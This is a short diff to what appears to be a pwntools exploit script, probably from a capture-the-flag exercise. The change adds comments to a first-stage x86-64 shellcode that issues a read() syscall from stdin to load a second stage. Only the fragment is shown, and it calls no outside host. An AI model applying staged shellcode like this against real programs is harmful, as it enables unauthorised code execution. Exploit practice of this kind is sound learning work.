@@ -7,10 +7,11 @@ context.arch = 'amd64'
 p = process("BINARY_FILE")
 
 stage_1 = asm("""
-    xor edi, edi
+    # Get rax's value by living off tha land.
+    xor edi, edi  # fd = stdin = 0
     push rdx
-    pop rsi       # Live off the land.
-    syscall
+    pop rsi       # Get rsi's value by living off the land.
+    syscall       # read()
 """)
 
 stage_2 = asm("""
